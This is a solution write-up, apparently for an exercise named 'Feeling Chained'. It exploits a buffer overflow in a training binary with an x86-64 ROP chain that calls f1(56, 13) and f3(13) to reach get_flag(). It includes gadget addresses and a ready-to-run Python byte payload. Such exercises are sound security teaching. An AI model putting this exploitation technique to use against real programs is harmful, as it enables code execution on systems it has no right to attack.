---
nav_order: 1
parent: 'Task: Feeling Chained'
---

# Solution

By using the buffer overflow in `gateway()`, functions `f1(56, 13)` and `f3(13)` need to be called in this order, with those exact parameters.
`f3` is the one that actually calls `get_flag()`.
Calling `get_flag()` directly shouldn't work (a global variable is checked to make sure all steps were made).

## x86-64 (64-bit) Solution

In x86-64, function parameters are passed through registers:

- First parameter: `RDI`
- Second parameter: `RSI`

We need a ROP (Return-Oriented Programming) chain to:

1. Call `f1(56, 13)` by setting `RDI=56` and `RSI=13`
1. Call `f3(13)` by setting `RDI=13`

With static linking, natural ROP gadgets from libc are available:

- `pop rdi; pop rbp; ret` at `0x4022c8`
- `pop rsi; pop rbp; ret` at `0x4050a6`

Since these gadgets also pop RBP, we need dummy values after each parameter.

The exploit payload structure:

```text
[18 bytes padding] +
[pop rdi; pop rbp; ret] + [56] + [dummy] +    # Set RDI = 56
[pop rsi; pop rbp; ret] + [13] + [dummy] +    # Set RSI = 13
[f1 address] +                                # Call f1(56, 13)
[pop rdi; pop rbp; ret] + [13] + [dummy] +    # Set RDI = 13
[f3 address]                                  # Call f3(13)
```

Run the exploit:

```sh
./exploit.sh | ./buff-ovf3
```

Or using Python:

```sh
python3 -c 'import sys; sys.stdout.buffer.write(
    b"A"*18 +
    b"\xc8\x22\x40\x00\x00\x00\x00\x00" +
    b"\x38\x00\x00\x00\x00\x00\x00\x00" +
    b"\x00\x00\x00\x00\x00\x00\x00\x00" +
    b"\xa6\x50\x40\x00\x00\x00\x00\x00" +
    b"\x0d\x00\x00\x00\x00\x00\x00\x00" +
    b"\x00\x00\x00\x00\x00\x00\x00\x00" +
    b"\x7f\x1a\x40\x00\x00\x00\x00\x00" +
    b"\xc8\x22\x40\x00\x00\x00\x00\x00" +
    b"\x0d\x00\x00\x00\x00\x00\x00\x00" +
    b"\x00\x00\x00\x00\x00\x00\x00\x00" +
    b"\x31\x1a\x40\x00\x00\x00\x00\x00"
)' | ./buff-ovf3
```
